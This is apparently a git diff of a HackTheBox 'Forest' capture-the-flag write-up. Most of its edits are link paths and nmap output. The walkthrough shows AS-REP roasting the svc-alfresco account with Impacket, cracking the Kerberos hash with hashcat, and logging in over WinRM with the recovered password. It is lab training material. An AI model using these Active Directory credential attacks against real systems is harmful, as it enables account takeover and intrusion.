@@ -6,8 +6,8 @@ A domain controller created by _HackTheBox_ with Exchange server installed in a 
 
 The machine covers the following techniques:
 
-* [AS-REP Roasting](../../../windows/auth/kerberos/as-rep-roasting-attack.md)
-* [DCSync attack](../../../windows/auth/credential/credential\_dumping.md#dcsync-attack)
+* [AS-REP Roasting](../../windows/credential-access/kerberos-ticket/as-rep-roasting-attack.md)
+* [DCSync attack](../../windows/credential-access/os-credential-dumping/credential\_dumping.md#dcsync-attack)
 * Bloodhound
 
 ## Reconnaissance
@@ -18,6 +18,7 @@ We use `nmap` to figure out what services are running on the target.
 
 ```bash
 $ nmap -Pn -n -sS -p- -T4 --min-rate 1000 <IP>
+...
 PORT      STATE SERVICE
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
@@ -27,10 +28,19 @@ PORT      STATE SERVICE
 445/tcp   open  microsoft-ds
 464/tcp   open  kpasswd5
 593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
 3268/tcp  open  globalcatLDAP
 3269/tcp  open  globalcatLDAPssl
 5985/tcp  open  wsman
 9389/tcp  open  adws
+49667/tcp open  unknown
+49689/tcp open  unknown
+49690/tcp open  unknown
+49702/tcp open  unknown
+50008/tcp open  unknown
+64429/tcp open  unknown
+...
 ```
 
 The results reveal the following information.
@@ -41,7 +51,7 @@ The results reveal the following information.
 
 ### LDAP
 
-It seems that we can fetch information about the target AD domain via [LDAP anonymous authentication](../../../windows/ad/adds/ldap.md#anonymous-authentication).
+It seems that we can fetch information about the target AD domain via [LDAP anonymous authentication](../../windows/ad/adds/ldap.md#anonymous-authentication).
 
 By querying the RootDSE information, we see that the target domain name is `htb.local.`
 
@@ -61,9 +71,9 @@ By Google, we found a product named [Alfresco Content Services](https://docs.alf
 
 From the configuration, we see that the account related to this service has been configured with _Kerberos pre-authentication_ disable.
 
-<figure><img src="../../../images/forest_alfresco.png" alt=""><figcaption><p><a href="https://docs.alfresco.com/process-services/latest/config/authenticate/#configuration-steps">Alfresco - Configuration Steps</a></p></figcaption></figure>
+<figure><img src="../../images/forest_alfresco.png" alt=""><figcaption><p><a href="https://docs.alfresco.com/process-services/latest/config/authenticate/#configuration-steps">Alfresco - Configuration Steps</a></p></figcaption></figure>
 
-This allows us to get the TGT for this account `svc-alfresco`, and conduct the [_AS-REP Roasting_ attack](../../../windows/auth/kerberos/as-rep-roasting-attack.md) to retrieve the account password from the requested TGT.
+This allows us to get the TGT for this account `svc-alfresco`, and conduct the [_AS-REP Roasting_ attack](../../windows/credential-access/kerberos-ticket/as-rep-roasting-attack.md) to retrieve the account password from the requested TGT.
 
 ### AS-REP Roasting
 
@@ -77,7 +87,7 @@ Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:25dea275afcce8003c360ab40353f112$1c819f4f545ec54a5b988c5402709abffb17105fd2e5ab6a47b0321fd90307767aef2e00f6504fc2eaf643c4884614ca62b6d938a45b19c87893b0bca1d1dfc3e628c97462de1625b8d492f0ad25932d37bc84e095a6bddcb6230d53066fa0c165a77a150e2837cf257c898e71c2fbb16411e905718cf59262d1d15159537a0c49c31b7f64d89f128e20a2becb4f0e47fd0b4ca10440539ca6038e5d14da2a8be833e857bc868afff34011a9ae150c4b296866c8dbddd48f9208bc324208b251af8ff35f7a205666166c8208c59cff2de2d9994aa67fc4e7eb6aac4b0cd9b1ec02bced2feb3a
 ```
 
-Refer to [AS-REP Roasting - Impacket](../../../windows/auth/kerberos/as-rep-roasting-attack.md#impacket) for more information.
+Refer to [AS-REP Roasting - Impacket](../../windows/credential-access/kerberos-ticket/as-rep-roasting-attack.md#impacket) for more information.
 
 We can crack the hash using `hashcat` with mode 18200:
 
@@ -91,11 +101,11 @@ HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b
 
 and get the password `s3rvice` for the account `svc-alfresco.`
 
-<figure><img src="../../../.gitbook/assets/圖片 (3) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/圖片 (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### WinRM
 
-We can now login to the target host with the credential we got via [WinRM](../../../windows/execution/remote/winrm.md).
+We can now login to the target host with the credential we got via [WinRM](../../windows/execution/remote/winrm.md).
 
 ```bash
 $ evil-winrm -i forest.htb -u svc-alfresco -p s3rvice
